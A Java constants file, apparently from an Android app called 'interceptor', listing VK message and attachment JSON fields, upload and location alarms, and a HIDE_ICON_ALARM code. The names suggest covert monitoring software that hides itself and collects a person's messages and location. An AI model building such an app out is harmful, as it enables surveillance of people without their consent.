package org.darkdefender.interceptor.utils;

public class Constants {

	//JSON PARAMETERS
	public static final String JSON_LINK = "link";
		//VK JSON PARAMETERS
		public static final String JSON_MID = "mid";
		public static final String JSON_UID = "uid";
		public static final String JSON_DATE = "date";
		public static final String JSON_OUT = "out";
		public static final String JSON_BODY = "body";
		//VK ATTCHMENTS
		public static final String JSON_OWNER_ID = "owner_id";
		public static final String JSON_TYPE = "type";
		public static final String JSON_SRC = "src";
		public static final String JSON_SRC_BIG = "src_big";
		public static final String JSON_TITLE = "title";
		public static final String JSON_IMAGE = "image";
		public static final String JSON_VID = "vid";
		public static final String JSON_ARTIST = "artist";
		
		
	public static final int VK_INCOME = 0;
	public static final int VK_OUTCOME = 1;
	
	public final static int HTTP_TIMEOUT_CONNECTION_MSEC = 7000;
	public final static int HTTP_TIMEOUT_SOCKET_MSEC = 5000;
	
	public final static String PREF_NAME = "INTERCEPTOR";
	
	public final static int LOCATION_ALARM = 1;
	public final static int HIDE_ICON_ALARM = 2;
	public final static int UPDATE_VK_MESSAGES = 3;
	public final static int TRY_UPLOAD = 4;
	public final static int UPDATE_USERS = 5;
	
	public final static long INTERVAL_15_MINUTES = 60 * 1000 * 15;
	
	public final static String TYPE_VIDEO =  "video"; 
	public final static String TYPE_PHOTO =  "photo"; 
	public final static String TYPE_AUDIO =  "audio"; 
	
}
